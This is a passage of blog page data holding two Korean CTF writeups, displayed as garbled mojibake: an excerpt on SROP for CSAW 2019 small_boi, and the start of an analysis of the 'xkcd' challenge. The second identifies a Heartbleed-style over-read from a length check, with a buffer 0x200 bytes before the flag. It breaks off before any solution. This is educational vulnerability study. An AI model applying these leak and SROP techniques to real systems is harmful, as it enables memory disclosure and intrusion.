ì²˜ë¦¬í•œë‹¤. ì»¤ë„ ëª¨ë“œì—ì„œ ìœ ì €ëª¨ë“œë¡œ ë“¤ì–´ì˜¤ëŠ” ê³¼ì •ì—ì„œ ìœ ì €ì˜ ìŠ¤íƒì— ë ˆì§€ìŠ¤í„° ì •ë³´ë“¤ì„ ì €ì¥í•´ ë†“ëŠ”ë‹¤.  ì€ ì´ë ‡ê²Œ ì €ì¥í•´ë†“ì€ ì •ë³´ë“¤ì„ ë‹¤ì‹œ ëŒë ¤ë†“ì„ ë•Œ ì‚¬ìš©ëœë‹¤. ê³µê²©ìê°€  ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•  ìˆ˜ ìˆê³  ìŠ¤íƒì„ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤ë©´ ëª¨ë“  ë ˆì§€ìŠ¤í„°ì™€ > ì„¸ê·¸ë¨¼íŠ¸ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤.  ì‹œìŠ¤í…œ ì½œì„ ì‚¬ìš©í•˜ì—¬ ìµìŠ¤í´ë¡œì‡ í•˜ëŠ” ê¸°ë²•ì„ SigReturn Oriented Programming > (SROP)ë¼ê³  í•œë‹¤. restore_sigcontext ,  ë§¤í¬ë¡œë¥¼ ì‚¬ìš©í•˜ì—¬ ë ˆì§€ìŠ¤í„°ë° ì„¸ê·¸ë¨¼íŠ¸ë¥¼ ë³µì›í•œë‹¤. sigcontext-32bit sigcontext-64bit í•´ë‹¹  êµ¬ì¡°ì²´ë¥¼ ë°”íƒ•ìœ¼ë¡œ SROP ê¸°ë²•ìœ¼ ì´ìš©í•˜ì—¬ ê³µê²©ì„ ì§„í–‰í•  ìˆ˜ ìˆë‹¤. ë¬¸ì œ small_boi.c ë¬¸ì œ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•´ ë³´ë©´  , ,  ë“± ìµìŠ¤ë¥¼ í•˜ê¸°ì— í•„ìš”í•œ ëª…ë ¹ë“¤ì´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©° ì¹´ë‹ˆë¦¬ ë³´í˜¸ ê¸°ë²•ì´ ê±¸ë ¤ ìˆì§€ ì•Šì•„ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œì¼œ â€¦","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 small_boi ì·¨ì•½ì  ë¶„ì„","categories":"CTF","author":"Zer0Luck","emoji":"ğŸ—"},"fields":{"slug":"/csaw_small_boi_ctf_writeup/"}},"next":{"id":"9a41bca5-49de-507b-a5a7-cc4a31a34f6d","html":"<h1 id=\"ì·¨ì•½ì -ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"ì·¨ì•½ì  ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì·¨ì•½ì  ë¶„ì„</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkUlEQVQI113IURKCIBSFYTeiFaRwQQGZKeOSSOmMZU47aP/baLC3Zr6H/5xsnD/9fcW4urD4uOLwcmHprg8XnsoGoVFoD42TxguNoJLG9ry+gMYMh3c/TjFO0zjjcLMXr+yZNwZUy2pNKjhUfJNiX6YgTGwTMmVje3Jays4YWUJOWUKqnLCCsoLy3fHf7ywo/wJQCCFWW7n4twAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/284023c502fc60db87e32cf7d9b3a3b3/37523/0.png\"\n        srcset=\"/static/284023c502fc60db87e32cf7d9b3a3b3/e9ff0/0.png 180w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/f21e7/0.png 360w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/37523/0.png 720w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/218a4/0.png 1052w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ê¸°íƒ€ ì •ë³´</p>\n<ul>\n<li>statically linked, 64 bit</li>\n<li>Heartbeat packet</li>\n</ul>\n<h2 id=\"ë³´í˜¸ê¸°ë²•\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"ë³´í˜¸ê¸°ë²• permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë³´í˜¸ê¸°ë²•</h2>\n<ul>\n<li>No RELRO</li>\n<li>No Canary found</li>\n<li>NX enabled</li>\n<li>No PIE</li>\n</ul>\n<h2 id=\"ë°”ì´ë„ˆë¦¬-ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"ë°”ì´ë„ˆë¦¬ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë°”ì´ë„ˆë¦¬ ë¶„ì„</h2>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">root@e5e68faa5052<span class=\"token operator\">:</span><span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>Zer0Luck<span class=\"token operator\">/</span>challenges<span class=\"token operator\">/</span>xkcd# <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>xkcd \nCould not open the flag<span class=\"token punctuation\">.</span>\n\n<span class=\"token operator\">-></span> í˜„ì¬ ë””ë ‰í† ë¦¬ì— flag íŒŒì¼ì„ ìƒì„±í•œ í›„ì— ë¶„ì„ì„ ì‹œë„í•˜ì</code></pre></div>\n<h2 id=\"main-í•¨ìˆ˜-ë¶„ì„\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main í•¨ìˆ˜ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main í•¨ìˆ˜ ë¶„ì„</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 468px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 126.11111111111113%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAZCAIAAAC+dZmEAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC/klEQVQ4y4WU247bOAyG8/5v00co0Mu26e6ig0mceuzEji1b57Oo08KZQbdN0y3BC0HQp58iRe72e46QOx7h1MAw6dM8zqu5XCxjQcokRPzVGQOA/OED2w2D8b4KkYzJOddSSggJIJVSY8z1keVcaq2fP8vd9erb1nSdbltPaTQWhAhSuhiLUtsVP1opm6e07X76JHfz7IwJACWEAOBSgghJyap1yTmnGKyJUlTvs7P5VfM/ZUrB+8pYnGcxDGRB4jxcn9ul7WnTiqal/SAuyHwbZkQUQL6Do/dxHOX5HGaUrSnSi0F2zFOs2aIo9VSDQHqe9WRtvFeOsV6v+nxmjFnGDGNcaUWYuFzdMAKaTIggrYlQ7hNGKSjlrQWlKkLZuRySp5YSSye5CKul9CnlXEou+R4mBGotfVe7gTfz6Z/Lc4sux/WE9BwiaNDM09Wsk56ksQCp1rdsv8EpZUrrsoR1tYw5xp2U/rUud3V6oBxCMSZiHK9XP00aEggrvUs/Ao8/CaXgXEUIzufQdWEcwZh0O1F/Zz/BUta2TaeTPxzSOHrODecOYyNlZSwrGUIK2tnHYadUhQjTZMdR9z1jkq2MaOWVqpxnITykaH14Ze6VAeo4bprT5PseOI+/a4l7mDEgpH75UpomIxSnyWgd6luey83+983GRCmDNdnaInilpKxLlaJC+FNLEgLOgZJZu0C0RFQjYmdqF6aIpsrr7099DNda+65+68Rp7C9oQSsngrukBXBmxK/6d2FngsuyFI6rtZEqwbTkjv85bIS8EAVTmLGbsFPBYLdQR7HFWHIHDhKEtJU65hhzdNEFiN/HUNi64oJb1H+9NB2aejJwx2NKs54Wg7aLDMYW3349H+VAhX6DuxdPaJ4XgYkizK5UCWV9DCa4lLfRs/XQbXSVvHndBuMW9sePYnc8OEIdC4sEGqs2hYYibZY8LbE6Y6CUxwnb7+Xu/ft1v2d//yWfvurjwR4O9niwx6O9rU3TmMPBPD//5E9P+uXFvXu3/AtM+ZRnl1MkTwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/f3572d894a13fd37dbfff522cf8d4e93/90372/1.png\"\n        srcset=\"/static/f3572d894a13fd37dbfff522cf8d4e93/e9ff0/1.png 180w,\n/static/f3572d894a13fd37dbfff522cf8d4e93/f21e7/1.png 360w,\n/static/f3572d894a13fd37dbfff522cf8d4e93/90372/1.png 468w\"\n        sizes=\"(max-width: 468px) 100vw, 468px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>flag íŒŒì¼ì˜ ë‚´ìš©ì„ ì½ì–´ì™€ flag ë³€ìˆ˜ì— ì§‘ì–´ë„£ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 606px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4ElEQVQY03WMTW+CQBRF+f8/pzsXsLClBqkhxpFVRYSREQozyEcZ5L03DcGkK2/O5p6bXCsI5Habr9eZ5+XHo4qiRspH04DIhlOszmmdpv1PqZUCKZs0feN8zHMQYiqKyeI8ESK4XLzrNajrZJqQiIwx4wjDMOGzzUGEYRBa/xsrSU5Z5sexy7lfVRGRAZhHpXRV/Xb9Q2tAJIAZIkNEiE+soviW0r/d3svyq+/PxpjluOvG+10jAiKaF7FsO3Scj9XKse1P1w0Zaxlrw7DzPLnZlLtdvd83izwcniyVsfYPxuIUn6XhKWEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/c7e0df71fb22c6468f806646d2a22537/4d4a2/2.png\"\n        srcset=\"/static/c7e0df71fb22c6468f806646d2a22537/e9ff0/2.png 180w,\n/static/c7e0df71fb22c6468f806646d2a22537/f21e7/2.png 360w,\n/static/c7e0df71fb22c6468f806646d2a22537/4d4a2/2.png 606w\"\n        sizes=\"(max-width: 606px) 100vw, 606px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">flag ì „ì—­ ë³€ìˆ˜</code></pre></div>\n<ul>\n<li>flag ë³€ìˆ˜ëŠ” .bss ì„¹ì…˜ì— ì¡´ì¬í•˜ë©° ì „ì—­ ë³€ìˆ˜ë¡œ í™•ì¸ëœë‹¤.</li>\n<li>ì‚¬ìš©ìì˜ ì…ë ¥ ê°’ì„ í† ëŒ€ë¡œ íŠ¹ì • ì¡°ê±´ì„ ìˆ˜í–‰í•˜ê²Œ ë˜ëŠ”ë° <code class=\"language-text\">strtok</code> í•¨ìˆ˜ë¥¼ ë°”íƒ•ìœ¼ë¡œ ë¬¸ì ë‹¨ìœ„ë¡œ ì§¤ë¼ í•´ë‹¹ ë¬¸ìì—´ì´ í¬í•¨ë˜ëŠ” ì§€ë¥¼ í™•ì¸í•˜ê³  ìˆë‹¤.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">SERVER<span class=\"token punctuation\">,</span> ARE YOU STILL THERE<span class=\"token operator\">?</span>\n\nIF SO<span class=\"token punctuation\">,</span> REPLY \"</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 296px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4UlEQVQY03WPT2vCQBTE/f5fRDyIKHjzpNAIaxqtxbAHRVOtEuIm63ub3e6/V1JKaQ8dhrn9ZpjeYd/udpimcrOB7RYYU4y1yyXO5+U6ky+vzVP2ljy/Z1mT5/hjzjFNHz0iCjEaQ23rAdzx6IrCnU6O87KqdPDBkXLBSKnprxB9B1sbAKKUTgh9uzXXa6X1R1WZy8UC2K490FdG778dI9W16+AYo1IEEAD8+UxFQZx7IbwQxhhL/6hbPuzbPMfpFPt9NR7jZHIfDB7DIY5GuFjUjEGSyNUKZ7OSMcG5+v35E3NTExm6SNfZAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/6bb772078781b14a91141d3726fe538e/b1a44/3.png\"\n        srcset=\"/static/6bb772078781b14a91141d3726fe538e/e9ff0/3.png 180w,\n/static/6bb772078781b14a91141d3726fe538e/b1a44/3.png 296w\"\n        sizes=\"(max-width: 296px) 100vw, 296px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"strtok\" style=\"position:relative;\"><a href=\"#strtok\" aria-label=\"strtok permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>strtok</h2>\n<ul>\n<li>ê·¸í›„ í•´ë‹¹ ë¶€ë¶„ì—ì„œ <code class=\"language-text\">\"</code> ê¹Œì§€ ì˜ë¼ í•´ë‹¹ ë¬¸ìì—´ì˜ ê°’ì„ <code class=\"language-text\">globals</code> ì „ì—­ ë³€ìˆ˜ì— memcpyë¥¼ í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 597px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAdUlEQVQI1xXCWwqDMBQFQPe/B7fRLUg/RD8UFIppC7apjxLDQZPeJKc4TFYU36oydW36fu+6y+OZL0uu9XUcHeABA/yAYG2YpvO6hnkWIJWlzZrmPgw3pZTWH2tfzr1Jeh8BL5JEGCNTogi37XwcdC6RbFv8Ac9Rbt/FtTruAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/2ce07033ee502d0147643f29bd5e3fa5/17602/4.png\"\n        srcset=\"/static/2ce07033ee502d0147643f29bd5e3fa5/e9ff0/4.png 180w,\n/static/2ce07033ee502d0147643f29bd5e3fa5/f21e7/4.png 360w,\n/static/2ce07033ee502d0147643f29bd5e3fa5/17602/4.png 597w\"\n        sizes=\"(max-width: 597px) 100vw, 597px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"globals-ì „ì—­-ë³€ìˆ˜\" style=\"position:relative;\"><a href=\"#globals-%EC%A0%84%EC%97%AD-%EB%B3%80%EC%88%98\" aria-label=\"globals ì „ì—­ ë³€ìˆ˜ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>globals ì „ì—­ ë³€ìˆ˜</h2>\n<ul>\n<li><code class=\"language-text\">globals</code> ì „ì—­ ë³€ìˆ˜ëŠ” ì´ 512ë°”ì´íŠ¸ì´ë©°, ê°™ì€ .bss ì˜ì—­ì´ë¯€ë¡œ ì•ì—ì„œ ì„ ì–¸ëœ flagì™€ëŠ” 0x200ì°¨ì´ê°€ ë‚˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ìˆë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 616px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAwklEQVQI102LO27DMBBEdf8rpM0RcgJVcaE0tCsJBuNYlKjIXMriB1yuuAaBFBkMHgYDvKZtZyHWy8Vcr6uUH+P4vv6+3W7DNB2PhzLm7tzhHFlLxlQC1OEcaZ2a0+m773+GYdKzCf6MeGfmGBMi8b+EwNvG3nPOtcy877kRolPqSykBMHrPpTBzAYgz2GmxMSDiwVyFlP5MxCo/n7npulbKVspPrXtrAyIRlX1P3ucYKeeScyEq21aWpTKE4n19APAF5kLhK6V3raIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/a66fd776c64ddf1016048ee1ef70b624/40040/5.png\"\n        srcset=\"/static/a66fd776c64ddf1016048ee1ef70b624/e9ff0/5.png 180w,\n/static/a66fd776c64ddf1016048ee1ef70b624/f21e7/5.png 360w,\n/static/a66fd776c64ddf1016048ee1ef70b624/40040/5.png 616w\"\n        sizes=\"(max-width: 616px) 100vw, 616px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>0x200 ë°”ì´íŠ¸ ì°¨ì´</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4klEQVQY043LS2uDQBSGYf//7wnZlugoWRXaTYuLBDJKnJtzc0Znjo4hEUIXDe3H4Wxenmy3K/b7qq6vxixKwelkMB7eP8jnd0uZVwr6PkgZlYLnSQnWzuezz6rq63isOdfrY1KO1oamNb3y3seUZoCwLPP6YyndvxAxK4q3ojh0XbcFxpzWATcTFVMAWH/bhjm/47wsK0rZFggZtJ4aPF46bkb3B0YoR6gkhGyB0oGxEWOrLXi//gejJ2bMSTXhy3BtnVYTAMQYX+I8PyCEKKVbEMIxGjtuhOtDhJTSkpZX+AYUQozgljia+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/cd58e795091c689ea83dab4ecabbf93a/37523/6.png\"\n        srcset=\"/static/cd58e795091c689ea83dab4ecabbf93a/e9ff0/6.png 180w,\n/static/cd58e795091c689ea83dab4ecabbf93a/f21e7/6.png 360w,\n/static/cd58e795091c689ea83dab4ecabbf93a/37523/6.png 720w,\n/static/cd58e795091c689ea83dab4ecabbf93a/0955e/6.png 901w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"ë¹„êµ\" style=\"position:relative;\"><a href=\"#%EB%B9%84%EA%B5%90\" aria-label=\"ë¹„êµ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë¹„êµ</h2>\n<ul>\n<li>strtok <code class=\"language-text\">(</code> <code class=\"language-text\">)</code> í•œ ë‚´ë¶€ì˜ íŠ¹ ì • ì •ìˆ˜ ê°’ì„ ë°”íƒ•ìœ¼ë¡œ <code class=\"language-text\">__isoc99_sscanf</code> í•¨ìˆ˜ì˜ ì¸ìë¡œ ì“°ì´ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li>\n<li>ì…ë ¥ ë°›ì€í›„ <code class=\"language-text\">globals</code> ì „ì—­ ë³€ìˆ˜ì˜ ê¸¸ì´ ê°’ê³¼ <code class=\"language-text\">()</code> ë‚´ë¶€ì—ìˆëŠ” ê°’ì„ ë¹„êµí•˜ì—¬  <code class=\"language-text\">globals</code> ì˜ ê¸¸ì´ê°€ ì‘ì„ ê²½ìš° <code class=\"language-text\">()</code> ì…ë ¥í•œ ê¸¸ì´ ë§Œí¼ ì¶œë ¥ì„ í•œë‹¤.</li>\n<li>ë§Œì•½ ë” í° ê°’ì„ ì…ë ¥í–ˆë‹¤ë©´ <code class=\"language-text\">Nice Try</code>ë¥¼ ì¶œë ¥í•œë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 463px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBUlEQVQY0yXLXU/CMBQA0P0TP1DcgH63t3ftBlulG2xLwEh40AQxgJro/3/WxPdzkmb9s3n+7oaPbvPZb79Ww6VaHuL6tBrObX95jMfQHkP71nTn2L5X8bDqzxK28/CC/jWJ631ZV8LmrqptMdfOgys4YN00Jvcac43O5L4MSwGWGVAWb9PsZjy+y2RSx71CN+WGG0cVUoVMYUok+AURMOWaCCDSKizGU45lmAngJh+l2dWdTLa7i3E+JVJhIcBxkwvjMqbzeWAaiQSmLFMIfpFRiWWgGqnGUTq5vpfJ0+4UuyHEnir7r6mElErjyhnXE6ZmwhAB0voHwrWbT5imEkZp9pd/AUz5RHuGgim0AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/b3fb4fb36506bf325dc0575af09e8cee/71ce0/7.png\"\n        srcset=\"/static/b3fb4fb36506bf325dc0575af09e8cee/e9ff0/7.png 180w,\n/static/b3fb4fb36506bf325dc0575af09e8cee/f21e7/7.png 360w,\n/static/b3fb4fb36506bf325dc0575af09e8cee/71ce0/7.png 463w\"\n        sizes=\"(max-width: 463px) 100vw, 463px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"í•´ê²°-ë°©ì•ˆ\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"í•´ê²° ë°©ì•ˆ permalink\" class=\"anchor before\"><svg 